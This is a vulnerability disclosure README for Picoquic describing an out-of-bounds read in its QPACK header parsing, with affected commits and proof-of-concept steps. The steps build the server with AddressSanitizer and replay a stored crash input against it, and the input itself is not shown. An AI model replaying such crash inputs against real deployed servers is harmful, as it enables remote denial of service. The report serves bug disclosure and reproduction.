# Bug M3

## Product: Pioquic
### Github repository: [https://github.com/private-octopus/picoquic](https://github.com/private-octopus/picoquic)
### Affected version: [8f4f77f](https://github.com/private-octopus/picoquic/commit/8f4f77f854cac40d8ff1a72fa60804c83b3aed60) until [c0f0313](https://github.com/private-octopus/picoquic/commit/c0f0313de4b8c35ea4f3193913674361a8b32692)
### Fixed version: N/A
### Affected QUIC implementations : Picoquic

### Bug summary:
The server attempted to access the first element of a 0 size heap, causing a heap overflow (out-of-bound read).

### Bug details:
The program access the first element of a 0 size heap at ```8f4f77f:picohttp/h3zero.c:415``` when parsing a QPACK header in the STREAM frame.

### Attack vector:
Remote attacker.

### PoC
Build the Picoquic server as described in the following (assumed you are in same directory as this README.md):
```bash
git clone https://github.com/h2o/picotls.git
cd picotls
git submodule init
git submodule update
git apply ../picotls.patch
cmake -DCMAKE_C_FLAGS="-fPIC" .
make
cd ..

git clone https://github.com/private-octopus/picoquic.git
cd picoquic
git apply ../picoquic.patch
cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" .
make clean all
cd ..

# start the server (use the cert and key provided)
picoquic/picoquicdemo -R 0 -p 4433 -c server-cert.pem  -k server-key.pem
```
Open another terminal, build the replay_crash program and run with the given crash input (assumed you are in same directory as this README.md):
```bash
cd ..
make
cd m3
../replay_crash picoquic_crash 4433
```